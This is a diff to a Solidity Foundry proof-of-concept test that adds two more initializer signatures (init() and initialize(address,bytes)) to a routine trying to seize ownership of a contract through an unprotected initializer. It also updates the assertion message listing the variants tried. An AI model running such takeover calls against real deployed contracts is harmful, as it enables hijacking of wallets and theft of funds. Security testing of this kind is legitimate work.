@@ -118,6 +118,15 @@ contract PoC is Test {
             abi.encodeWithSignature("init(address[])", one)
         );
         if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "init()", abi.encodeWithSignature("init()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "initialize(address,bytes)",
+            abi.encodeWithSignature("initialize(address,bytes)", attacker, bytes(""))
+        );
+        if (bytes(used).length > 0) return used;
         return "";
     }
 
@@ -134,7 +143,7 @@ contract PoC is Test {
         assertGt(
             delta,
             0,
-            "no initializer variant changed the owner/initialized observable. Tried initialize(address), initialize(address,address), initialize(), initialize(address[]), init(address), initWallet(address[]), init(address[]). This does NOT establish safety: the initializer may be guarded by an `initializer` modifier or an owner check, already initialized, named differently, take other arguments, or the owner may live in another slot."
+            "no initializer variant changed the owner/initialized observable. Tried initialize(address), initialize(address,address), initialize(), initialize(address[]), init(address), initWallet(address[]), init(address[]), init(), initialize(address,bytes). This does NOT establish safety: the initializer may be guarded by an `initializer` modifier or an owner check, already initialized, named differently, take other arguments, or the owner may live in another slot."
         );
     }
 }
